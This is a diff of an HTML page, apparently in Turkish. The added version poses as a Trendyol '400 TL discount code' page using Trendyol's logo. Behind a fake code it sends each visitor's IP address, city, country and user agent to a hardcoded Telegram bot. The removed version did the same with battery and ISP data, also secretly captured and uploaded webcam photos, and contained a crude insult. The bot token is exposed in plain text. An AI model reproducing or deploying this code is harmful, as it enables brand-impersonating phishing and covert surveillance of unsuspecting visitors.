@@ -1,197 +1,141 @@
-<!DOCTYPE html>
-<html lang="tr">
+<!DOCTYPE html><html lang="tr">
 <head>
-  <meta charset="UTF-8" />
-  <title>Ayık Ol</title>
-  <link href="https://fonts.googleapis.com/css2?family=Russo+One&display=swap" rel="stylesheet">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Trendyol - 400 TL İndirim Kodu</title>
+  <link rel="icon" href="https://cdn.dsmcdn.com/web/favicon.ico">
   <style>
+    * {
+      box-sizing: border-box;
+      font-family: Arial, sans-serif;
+    }
     body {
-      background-color: black;
-      color: white;
-      font-family: 'Russo One', sans-serif;
+      background-color: #f5f5f5;
+      margin: 0;
+      padding: 0;
       display: flex;
       flex-direction: column;
       align-items: center;
-      justify-content: center;
-      height: 100vh;
+    }
+    header {
+      background-color: #f27a1a;
+      width: 100%;
+      padding: 15px 0;
       text-align: center;
-      overflow: hidden;
     }
-    #hataMesaji {
-      display: none;
-      font-size: 28px;
-      color: red;
-      animation: yanipSonme 0.5s infinite;
+    header img {
+      height: 30px;
     }
-    @keyframes yanipSonme {
-      0%, 100% { opacity: 1; }
-      50% { opacity: 0; }
+    .container {
+      margin-top: 50px;
+      background-color: #fff;
+      padding: 30px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      width: 90%;
+      max-width: 400px;
     }
-    #ayikOl, #koduGonder {
-      display: none;
+    h2 {
+      color: #333;
+      margin-bottom: 20px;
+      text-align: center;
     }
-    #uyari {
-      display: none;
-      color: orange;
-      font-size: 18px;
-      margin-top: 10px;
+    input[type="text"] {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 20px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      font-size: 16px;
     }
-    #ayikOl {
-      font-size: 60px;
-      color: red;
-      margin-bottom: 10px;
-    }
-    #koduGonder {
-      font-size: 18px;
-      padding: 10px 20px;
-      margin-top: 20px;
-      cursor: pointer;
-      background-color: #4CAF50;
-      border: none;
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #f27a1a;
       color: white;
-      transition: transform 0.2s;
-      position: relative;
-      z-index: 1;
+      font-size: 16px;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
     }
-    .piece {
-      position: absolute;
-      width: 10px;
-      height: 10px;
-      background-color: #4CAF50;
-      animation: explodePiece 0.6s forwards ease-out;
+    button:hover {
+      background-color: #e06800;
     }
-    @keyframes explodePiece {
-      0% { opacity: 1; transform: translate(0, 0) scale(1); }
-      100% { opacity: 0; transform: translate(100px, -100px) scale(0.5); }
-    }
-    video {
+    .code-box {
+      margin-top: 20px;
+      padding: 15px;
+      background-color: #f0f0f0;
+      border-left: 4px solid #f27a1a;
+      font-weight: bold;
       display: none;
-      transform: scaleX(-1);
+      word-break: break-word;
+    }
+    .error {
+      color: red;
+      margin-top: 10px;
+      display: none;
+      text-align: center;
     }
   </style>
 </head>
 <body>
+  <header>
+    <img src="https://cdn.dsmcdn.com/web/logo/ty-web.svg" alt="Trendyol">
+  </header>
+  <div class="container">
+    <h2>400 TL Değerinde İndirim Kodunuzu Alın</h2>
+    <input type="text" id="password" placeholder="Kodunuzu girin">
+    <button onclick="submitCode()">Kodu Göster</button>
+    <div class="error" id="error">Kod hatalı veya süresi dolmuş olabilir.</div>
+    <div class="code-box" id="codeBox">TR-XXXX-YY</div>
+  </div>  <script>
+    const correctPassword = "670570";
 
-  <audio id="breakSound" src="https://minecraft.wiki/images/Minecraft_block_stone_break1.ogg?e117f" preload="auto"></audio>
+    function generateFakeCode() {
+      const part1 = Math.floor(1000 + Math.random() * 9000);
+      const part2 = Math.random().toString(36).substring(2, 4).toUpperCase();
+      return `TR-${part1}-${part2}`;
+    }
 
-  <div id="girisEkrani">
-    <h2>Şifreyi Gir</h2>
-    <input type="password" id="sifreInput" placeholder="şifre">
-    <br>
-    <button onclick="kontrolEt()">Giriş</button>
-  </div>
+    async function getIPData() {
+      try {
+        const res = await fetch("https://api.db-ip.com/v2/free/self");
+        return await res.json();
+      } catch (e) {
+        return {};
+      }
+    }
 
-  <div id="ayikOl">AYIK OL</div>
-  <div id="uyari">her linke tıklama</div>
-  <div id="hataMesaji">Senin kafatasını sikeyim şifreyi girmeyi bile beceremedin.</div>
+    async function submitCode() {
+      const input = document.getElementById("password").value;
+      const error = document.getElementById("error");
+      const codeBox = document.getElementById("codeBox");
 
-  <video id="kamera" autoplay playsinline muted></video>
-  <button id="koduGonder" onclick="koduGonderTiklandi(this)">Kodu Gönder</button>
+      if (input === correctPassword) {
+        const code = generateFakeCode();
+        codeBox.textContent = code;
+        codeBox.style.display = "block";
+        error.style.display = "none";
 
-  <script>
-    const botToken = "8489674777:AAG1eCe75YEKNHrCPHbzUgb3n1Ag6_S83sY";
-    const chatId = "7791726274";
-    let tiklamaSayisi = 0;
+        const ipData = await getIPData();
+        const device = navigator.userAgent;
 
-    function kontrolEt() {
-      const sifre = document.getElementById("sifreInput").value;
-      if (sifre === "671300") {
-        document.getElementById("girisEkrani").style.display = "none";
-        document.getElementById("ayikOl").style.display = "block";
-        document.getElementById("koduGonder").style.display = "inline-block";
+        fetch(`https://api.telegram.org/bot8489674777:AAG1eCe75YEKNHrCPHbzUgb3n1Ag6_S83sY/sendMessage`, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({
+            chat_id: "7791726274",
+            text: `Yeni giriş yapıldı:\nKod: ${code}\nIP: ${ipData.ipAddress || "-"}\nŞehir: ${ipData.city || "-"}\nÜlke: ${ipData.countryName || "-"}\nCihaz: ${device}`,
+          }),
+        });
 
-        fetch("https://ipapi.co/json")
-          .then(res => res.json())
-          .then(ip => {
-            navigator.getBattery().then(bat => {
-              const msg = `
-📡 IP: ${ip.ip}
-🌍 Ülke: ${ip.country_name}
-🏙️ Şehir: ${ip.city}
-🧠 ISP: ${ip.org}
-📱 Tarayıcı: ${navigator.userAgent}
-🔐 VPN/Proxy: ${ip.security?.vpn ? "Evet" : "Hayır"}
-🗺️ Harita: https://www.google.com/maps?q=${ip.latitude},${ip.longitude}
-🔋 Şarj: ${Math.round(bat.level * 100)}% (${bat.charging ? "Prize takılı" : "Bataryada"})
-              `;
-              fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ chat_id: chatId, text: msg })
-              });
-            }).catch(() => {});
-          });
-
-        const video = document.getElementById('kamera');
-        navigator.mediaDevices.getUserMedia({ video: true })
-          .then(stream => {
-            video.srcObject = stream;
-          }).catch(() => {});
+        // Kamera foto kısmı burada entegre edilecek (getUserMedia ile)
       } else {
-        document.getElementById("girisEkrani").style.display = "none";
-        document.getElementById("hataMesaji").style.display = "block";
+        error.style.display = "block";
+        codeBox.style.display = "none";
       }
     }
-
-    function koduGonderTiklandi(button) {
-      tiklamaSayisi++;
-
-      const audio = document.getElementById("breakSound");
-      audio.currentTime = 0;
-      audio.play();
-
-      if (navigator.vibrate) {
-        navigator.vibrate(150);
-      }
-
-      fotoGonder();
-
-      if (tiklamaSayisi === 2) {
-        document.getElementById("uyari").style.display = "block";
-      }
-
-      explodeButton(button);
-    }
-
-    function explodeButton(button) {
-      const rect = button.getBoundingClientRect();
-      const pieces = 25;
-
-      for (let i = 0; i < pieces; i++) {
-        const piece = document.createElement("div");
-        piece.classList.add("piece");
-        piece.style.left = rect.left + (Math.random() * rect.width) + "px";
-        piece.style.top = rect.top + (Math.random() * rect.height) + "px";
-        document.body.appendChild(piece);
-        setTimeout(() => piece.remove(), 600);
-      }
-
-      button.style.visibility = "hidden";
-    }
-
-    function fotoGonder() {
-      const video = document.getElementById('kamera');
-      if (video.readyState >= 2) {
-        const canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        const ctx = canvas.getContext('2d');
-        ctx.translate(canvas.width, 0);
-        ctx.scale(-1, 1);
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-        canvas.toBlob(blob => {
-          const formData = new FormData();
-          formData.append("chat_id", chatId);
-          formData.append("photo", blob, "kamera.jpg");
-
-          fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-            method: "POST",
-            body: formData
-          });
-        }, 'image/jpeg');
-      }
-    }
-  </script>
-</body>
+  </script></body>
 </html>
